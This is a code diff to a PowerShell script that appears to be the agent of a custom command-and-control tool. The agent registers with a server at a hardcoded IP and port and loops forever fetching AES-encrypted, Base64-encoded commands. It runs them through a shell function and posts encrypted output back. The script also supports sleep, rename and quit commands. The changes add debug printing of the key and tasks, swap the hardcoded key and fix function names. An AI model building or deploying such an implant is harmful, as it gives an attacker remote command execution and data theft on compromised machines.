@@ -34,6 +34,7 @@ function Encrypt-String($key, $unencryptedString) {
 }
 
 function Decrypt-String($key, $encryptedStringWithIV) {
+    Write-Host $key
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
     $aesManaged = Create-AesManagedObject $key $IV
@@ -68,8 +69,8 @@ $ip   = "192.168.0.28"
 $port = "9090"
 ## secrets.token_hex(32)
 ## secrets.token_urlsafe(32)
-$key  = "hMxuFHQXf1Q0yew4YyeMiVofS/oJVdw2FynMRMy/wcs="
-$n    = 10
+$key  = 'SP8Y4Uv9KRtnoJqefyBolUHjtm96PdG28JVD2V3PAeo='
+$n    = 2
 $name = ""
 $code = ""
 
@@ -81,31 +82,35 @@ $data  = @{
     type = "$type"
     }
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
-## debugggggggg
-$name = "cKrOXnHoyE"
 sleep $n
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
 
 for (;;){
+
+    Write-Host "Doing one more loop"
     
     ### check response NOT existence
     $taskId = ""
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
     # $task = ""
+    Write-Host $task
     
     if (-Not [string]::IsNullOrEmpty($task)){
         
-        $task = Decrypt $key $task
+        $task = Decrypt-String $key $task
+        Write-Host $task
         $task = $task.split()
         $flag = $task[0]
         $taskId = $task[1]
         
         if ($flag -eq "VALID"){
             
-            $command = $task[2]
-            $args = $task[3..$task.Length]
+            $decoded_command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task[2]))
+            $decoded_command = $decoded_command.split()
+            $command = $decoded_command[0]
+            $args = $decoded_command[1..$decoded_command.Length]
 
             if ($command -eq "shell"){
             
@@ -115,7 +120,7 @@ for (;;){
                 foreach ($a in $args){ $arg += $a + " " }
 
                 $res  = shell $f $arg
-                $res  = Encrypt $key $res
+                $res  = Encrypt-String $key $res
                 $data = @{result = "$res"}
 
                 $resultfl = ("$resultl" + "$taskId")
@@ -131,7 +136,7 @@ for (;;){
                 foreach ($a in $args){ $arg += $a + " " }
 
                 $res  = shell $f $arg
-                $res  = Encrypt $key $res
+                $res  = Encrypt-String $key $res
                 $data = @{result = "$res"}
 
                 $resultfl = ("$resultl" + "$taskId")
@@ -142,7 +147,9 @@ for (;;){
             elseif ($command -eq "sleep"){
 
                 $n    = [int]$args[0]
-                $data = @{result = ""}
+                $res = "sleep set to " + "$args[0]" + "sec"
+                $res  = Encrypt-String $key
+                $data = @{result = "$res"}
                 $resultfl = ("$resultl" + "$taskId")
                 Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
             }
@@ -150,14 +157,14 @@ for (;;){
                 
                 $name    = $args[0]
                 $res = "VALID agent renamed to " + "$name"
-                $res  = Encrypt $key $res
-                $data    = @{result = ""}
+                $res  = Encrypt-String $key $res
+                $data    = @{result = "$res"}
                 $resultfl = ("$resultl" + "$taskId")
                 Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
             }
             elseif ($command -eq "quit"){
                 $res = "VALID agent dead " + "$name"
-                $res  = Encrypt $key $res
+                $res  = Encrypt-String $key $res
                 $data    = @{result = "$res"}
 
                 $resultfl = ("$resultl" + "$taskId")
